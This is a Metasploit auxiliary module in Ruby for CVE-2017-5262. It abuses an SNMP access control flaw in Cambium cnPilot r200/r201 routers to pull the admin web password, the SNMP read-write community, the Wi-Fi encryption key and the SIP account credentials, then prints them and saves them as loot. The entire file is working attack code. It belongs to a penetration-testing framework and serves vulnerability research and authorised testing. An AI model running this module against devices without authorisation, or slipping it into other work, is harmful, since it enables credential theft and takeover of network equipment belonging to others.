##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'Cambium cnPilot r200/r201 SNMP Enumeration',
      'Description' => %{
        Cambium cnPilot r200/r201 devices can be administered using SNMP. The
        device configuration contains IP addresses, keys, passwords, & lots of juicy
        information. This module exploits an access control flaw, which allows remotely
        extracting sensitive information such as account passwords, WiFI PSK, & SIP
        credentials via SNMP Read-Only (RO) community string.
      },
      'Author' => ['Karn Ganeshen'],
      'References' =>
        [
          ['CVE', '2017-5262'],
          ['URL', 'https://blog.rapid7.com/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities']
        ],
      'License' => MSF_LICENSE
    )

    register_options(
      [
        OptInt.new('TIMEOUT', [true, 'SNMP connection timeout', 10])
      ], self.class
    )
  end

  def run_host(ip)
    begin
      snmp = connect_snmp
      print_good("#{ip}, Connected.\n")

      cnpilot_info = ''

      # System Info
      snmp_system_name = snmp.get_value('1.3.6.1.4.1.41010.1.1.1.0')
      snmp_system_description = snmp.get_value('1.3.6.1.2.1.1.1.0')
      cnpilot_system_uptime = snmp.get_value('1.3.6.1.2.1.1.3.0')
      cnpilot_hardware_version = snmp.get_value('1.3.6.1.4.1.41010.1.1.4.0')
      cnpilot_firmware_version = snmp.get_value('1.3.6.1.4.1.41010.1.1.5.0')

      cnpilot_info << "SNMP System Name: #{snmp_system_name}" << "\n"
      cnpilot_info << "SNMP System Description: #{snmp_system_description}" << "\n"
      cnpilot_info << "Device UpTime: #{cnpilot_system_uptime}" << "\n"
      cnpilot_info << "Hardware version: #{cnpilot_hardware_version}" << "\n"
      cnpilot_info << "Firmware version: #{cnpilot_firmware_version}" << "\n"

      # cnPilot Web Management Admin account Info
      admin_username = snmp.get_value('1.3.6.1.4.1.41010.1.7.12.0')
      admin_password = snmp.get_value('1.3.6.1.4.1.41010.1.7.13.0')

      cnpilot_info << "Web Management Admin Login Name: #{admin_username}" << "\n"
      cnpilot_info << "Web Management Admin Login Password: #{admin_password}" << "\n"

      # SNMP Info
      snmp_readonly_community = snmp.get_value('1.3.6.1.4.1.41010.1.9.2.0')
      snmp_readwrite_community = snmp.get_value('1.3.6.1.4.1.41010.1.9.3.0')
      snmp_trap_community = snmp.get_value('1.3.6.1.4.1.41010.1.9.4.0')
      snmp_trap_entry_ip = snmp.get_value('1.3.6.1.4.1.41010.1.9.1.0')

      cnpilot_info << "SNMP read-only community name: #{snmp_readonly_community}" << "\n"
      cnpilot_info << "SNMP read-write community name: #{snmp_readwrite_community}" << "\n"
      cnpilot_info << "SNMP Trap Community: #{snmp_trap_community}" << "\n"
      cnpilot_info << "SNMP Trap Server IP Address: #{snmp_trap_entry_ip}" << "\n"

      # WIFI Info
      wireless_interface_ssid = snmp.get_value('1.3.6.1.4.1.41010.1.10.2.1.1.1.6.1')
      wireless_interface_encryptionkey = snmp.get_value('1.3.6.1.4.1.41010.1.10.2.1.1.1.8.1')
      wireless_interface_encryption = snmp.get_value('1.3.6.1.4.1.41010.1.10.2.1.1.1.7.1')

      cnpilot_info << "Wireless Interface SSID: #{wireless_interface_ssid}" << "\n"
      cnpilot_info << "Wireless Interface Encryption Key: #{wireless_interface_encryptionkey}" << "\n"
      cnpilot_info << "Wireless Interface Encryption (1 - Open mode, 2 - wpa2 mode, 3 - EAP-TTLS): #{wireless_interface_encryption}" << "\n"

      # SIP Account Info
      sip_accountnumber = snmp.get_value('1.3.6.1.4.1.41010.1.5.1.1.11.1')
      sip_accountpassword = snmp.get_value('1.3.6.1.4.1.41010.1.5.1.1.12.1')

      cnpilot_info << "SIP Account Number: #{sip_accountnumber}" << "\n"
      cnpilot_info << "SIP Account Password: #{sip_accountpassword}" << "\n"

      # Printing captured info
      print_status("Fetching System Information...\n")
      print_good("SNMP System Name: #{snmp_system_name}")
      print_good("SNMP System Description: #{snmp_system_description}")
      print_good("Device UpTime: #{cnpilot_system_uptime}")
      print_good("Hardware version: #{cnpilot_hardware_version}")
      print_good("Firmware version: #{cnpilot_firmware_version}\n")

      print_status("Fetching Login Account Information...\n")
      print_good("Web Management Admin Login Name: #{admin_username}")
      print_good("Web Management Admin Login Password: #{admin_password}\n")

      print_status("Fetching SNMP Information...\n")
      print_good("SNMP read-only community name: #{snmp_readonly_community}")
      print_good("SNMP read-write community name: #{snmp_readwrite_community}")
      print_good("SNMP Trap Community: #{snmp_trap_community}")
      print_good("SNMP Trap Server IP Address: #{snmp_trap_entry_ip} \n")

      print_status("Fetching WIFI Information...\n")
      print_good("Wireless Interface SSID: #{wireless_interface_ssid}")
      print_good("Wireless Interface Encryption Key: #{wireless_interface_encryptionkey}")
      print_good("Wireless Interface Encryption (1 - Open mode, 2 - wpa2 mode, 3 - EAP-TTLS): #{wireless_interface_encryption} \n")

      print_status("Fetching SIP Account Information...\n")
      print_good("SIP Account Number: #{sip_accountnumber}")
      print_good("SIP Account Password: #{sip_accountpassword}\n")

      # Woot we got loot.
      loot_name     = 'snmp_loot'
      loot_type     = 'text/plain'
      loot_filename = 'cnpilot_snmp_loot.txt'
      loot_desc     = 'Cambium cnPilot configuration data'
      p = store_loot(loot_name, loot_type, datastore['RHOST'], cnpilot_info, loot_filename, loot_desc)
      print_good("Cambium cnPilot SNMP loot saved at #{p} \n")

    rescue SNMP::RequestTimeout
      print_error("#{ip} SNMP request timeout.")
    rescue Rex::ConnectionError
      print_error("#{ip} Connection refused.")
    rescue SNMP::InvalidIpAddress
      print_error("#{ip} Invalid IP Address. Check it with 'snmpwalk tool'.")
    rescue SNMP::UnsupportedVersion
      print_error("#{ip} Unsupported SNMP version specified. Select from '1' or '2c'.")
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("Unknown error: #{e.class} #{e}")
      elog("Unknown error: #{e.class} #{e}")
      elog("Call stack:\n#{e.backtrace.join "\n"}")
    ensure
      disconnect_snmp
    end
  end
end
